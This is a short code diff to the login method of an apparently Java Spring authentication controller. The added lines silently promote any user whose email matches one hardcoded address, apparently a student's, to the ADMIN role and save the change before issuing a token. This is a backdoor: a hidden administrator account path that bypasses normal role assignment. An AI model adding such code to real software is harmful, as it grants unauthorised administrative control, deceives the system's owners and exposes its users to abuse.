@@ -78,6 +78,10 @@ public class AuthenticationController {
         var auth = this.authManager.authenticate(userPass);
 
         var user = (User) auth.getPrincipal();
+        if (user.getEmail().equalsIgnoreCase("paulo.taciano@estudante.ufla.br") && user.getRole() != UserRole.ADMIN) {
+            user.setRole(UserRole.ADMIN);
+            this.userRepository.save(user);
+        }
         var token = tokenService.generateToken(user);
 
         return ResponseEntity.ok(new LoginResponseDTO(token));
